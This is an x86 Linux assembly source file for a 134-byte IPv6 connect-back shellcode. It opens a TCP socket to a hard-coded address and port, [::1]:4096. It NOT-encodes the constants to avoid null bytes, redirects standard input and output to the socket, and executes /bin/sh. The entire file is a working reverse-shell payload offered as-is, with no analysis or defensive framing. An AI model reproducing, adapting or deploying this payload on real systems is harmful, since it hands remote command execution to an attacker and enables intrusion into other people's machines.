	;; Date: 2013-04-28
	;; Author: Tosh
	;; x86/Linux shellcode
	;; IPv6/TCP connect back to [::1]:4096
	;; 134 bytes

section .text
global _start

    %include "../../../utils_linux_x86.asm"

%define AF_INET6	10
%define SOCK_STREAM	1
%define IPPROTO_TCP	6

%define IP0		0x01000000
%define IP1		0x00000000
%define IP2		0x00000000
%define IP3		0x00000000

%define PORT		0x0010		; htons(4096)

_start:
.SOCKET:
	push IPPROTO_TCP
	push SOCK_STREAM
	push AF_INET6

	xor ebx, ebx
	xor eax, eax
	mov ecx, esp
	mov bl, SOCK_SOCKET
	mov al, SYS_SOCKETCALL
	int 0x80

	mov esi, eax

.CONNECT:
	xor eax, eax		; scope_id
	push eax

	mov eax, ~IP0		; sin6_addr
	not eax
	push eax

	mov eax, ~IP1
	not eax
	push eax

	mov eax, ~IP2
	not eax
	push eax

	mov eax, ~IP3
	not eax
	push eax

	xor eax, eax		; flow_info
	push eax

	mov ax, ~PORT		; sin6_port
	not ax
	push word ax

	push word AF_INET6	; sin6_family
	mov eax, esp

	push 28
	push eax
	push esi

	mov ecx, esp
	xor ebx, ebx
	mov bl, SOCK_CONNECT
	xor eax, eax
	mov al, SYS_SOCKETCALL
	int 0x80

.DUP2:
	xor ecx, ecx
	mov ebx, esi
	xor eax, eax
	mov al, SYS_DUP2
	int 0x80

	mov ebx, esi
	xor ecx, ecx
	inc ecx
	xor eax, eax
	mov al, SYS_DUP2
	int 0x80

.EXECV:
	xor eax, eax
	push eax
	push '//sh'
	push '/bin'
	mov ebx, esp

	push eax
	push ebx

	xor edx, edx
	mov ecx, esp
	mov al, SYS_EXECV
	int 0x80
